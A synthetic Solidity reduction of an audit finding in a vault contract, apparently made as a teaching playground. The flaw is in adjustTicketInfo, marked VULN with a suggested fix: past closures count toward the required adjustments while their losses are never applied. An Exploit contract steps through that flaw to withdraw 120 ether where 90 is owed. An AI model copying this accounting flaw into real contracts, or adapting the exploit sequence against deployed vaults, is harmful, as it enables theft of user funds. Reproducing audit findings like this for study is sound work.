// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Abacus Vault — past closures satisfy adjustTicketInfo without the loss
    (OtterSec, finding #48701)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: adjustTicketInfo increments adjustmentsMade and returns when
    the closure epoch is before the trader's startEpoch. Three past ids plus
    two profitable ids reach adjustmentsRequired, and the three in-range
    losses are never applied. */

contract Asset {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Vault {
    struct Trader {
        uint256 startEpoch;
        uint256 unlockEpoch;
        uint256 value;
    }

    Asset public asset;
    bool public enforceRange;
    uint256 public adjustmentsRequired;
    uint256 public withdrawn;
    mapping(address => mapping(uint256 => Trader)) public traderProfile;
    mapping(address => mapping(uint256 => uint256)) public adjustmentsMade;
    mapping(uint256 => uint256) public epochOfClosure;
    mapping(uint256 => int256) public closurePnl;

    constructor(Asset asset_, bool enforceRange_) {
        asset = asset_;
        enforceRange = enforceRange_;
        asset_.mint(address(this), 120 ether);
    }

    function loadClosures() external {
        epochOfClosure[1] = 1;
        epochOfClosure[2] = 2;
        epochOfClosure[3] = 3;
        epochOfClosure[4] = 7;
        closurePnl[4] = -10 ether;
        epochOfClosure[5] = 8;
        closurePnl[5] = -10 ether;
        epochOfClosure[6] = 9;
        closurePnl[6] = -10 ether;
        epochOfClosure[7] = 8;
        closurePnl[7] = 10 ether;
        epochOfClosure[8] = 9;
        closurePnl[8] = 10 ether;
    }

    function buy(address user, uint256 nonce) external {
        traderProfile[user][nonce] = Trader({startEpoch: 6, unlockEpoch: 10, value: 100 ether});
        adjustmentsMade[user][nonce] = 3;
        adjustmentsRequired = 8;
    }

    function adjustTicketInfo(address user, uint256 nonce, uint256 closureId) external returns (bool) {
        Trader storage trader = traderProfile[user][nonce];
        uint256 epoch = epochOfClosure[closureId];
        bool outOfRange = trader.unlockEpoch < epoch || trader.startEpoch > epoch;
        if (outOfRange) {
            if (!enforceRange) {
                adjustmentsMade[user][nonce]++; // @> VULN: a past closure counts and skips internalAdjustment
                // FIX: do not increment adjustmentsMade when epoch < startEpoch
                return true;
            }
            return false;
        }
        adjustmentsMade[user][nonce]++;
        int256 pnl = closurePnl[closureId];
        if (pnl >= 0) trader.value += uint256(pnl);
        else trader.value -= uint256(-pnl);
        return true;
    }

    function sell(address user, uint256 nonce) external returns (uint256 value) {
        require(adjustmentsMade[user][nonce] == adjustmentsRequired, "open");
        value = traderProfile[user][nonce].value;
        traderProfile[user][nonce].value = 0;
        asset.transfer(user, value);
        withdrawn = value;
    }
}

contract Exploit {
    Asset public asset;
    Vault public vault;
    uint256 public withdrawn;
    uint256 public made;

    constructor() {
        asset = new Asset();
        vault = new Vault(asset, false);
    }

    function run() external {
        address attacker = msg.sender;
        vault.loadClosures();
        vault.buy(attacker, 1);
        vault.adjustTicketInfo(attacker, 1, 1);
        vault.adjustTicketInfo(attacker, 1, 2);
        vault.adjustTicketInfo(attacker, 1, 3);
        vault.adjustTicketInfo(attacker, 1, 7);
        vault.adjustTicketInfo(attacker, 1, 8);
        withdrawn = vault.sell(attacker, 1);
        made = vault.adjustmentsMade(attacker, 1);
        require(made == 8, "quota");
        require(withdrawn == 120 ether, "inflated");
        require(withdrawn - 30 ether == 90 ether, "three losses skipped");
        require(asset.balanceOf(attacker) == 120 ether, "paid");
    }
}
